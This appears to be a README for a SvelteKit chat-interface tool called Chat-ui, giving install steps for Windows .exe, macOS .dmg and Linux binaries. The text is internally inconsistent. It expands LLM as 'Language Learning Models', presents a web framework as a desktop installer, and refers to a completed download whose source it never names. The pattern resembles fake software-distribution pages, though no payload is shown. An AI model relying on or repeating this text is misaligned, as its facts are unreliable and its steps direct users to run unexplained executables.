## 🛠️ Overview
Chat-ui allows you to build a chat interface for Language Learning Models (LLMs) using SvelteKit. This software makes it simple for you to integrate with OpenAI-compatible APIs. Whether you are looking to enhance communication in your app or build an interactive chatbot, Chat-ui provides the tools you need.

Before you run Chat-ui, ensure your system meets the following requirements:

- **RAM:** At least 4 GB of RAM.

- **Network:** An internet connection to access APIs.

## 📥 Download & Install
Once the download is complete, you are ready to install Chat-ui. Follow these steps based on your operating system:

### Windows
1. Locate the downloaded `chat-ui-windows.exe` file in your Downloads folder.
2. Double-click the file to start the installation.
3. Follow the prompts in the installation wizard.
4. After installation, you can find Chat-ui in your Start Menu. Open it to start building your chat interface.

### macOS
1. Open the `chat-ui-mac.dmg` file you downloaded.
2. Drag the Chat-ui icon into your Applications folder.
3. You can now find Chat-ui in your Applications. Open it to start using it.

### Linux
1. Extract the contents of the `chat-ui-linux.tar.gz` file to a directory of your choice.
2. Open a terminal and navigate to the directory where you extracted the files.
3. Run the application using the command `./chat-ui` in the terminal.
4. You can now start building your chat interface.
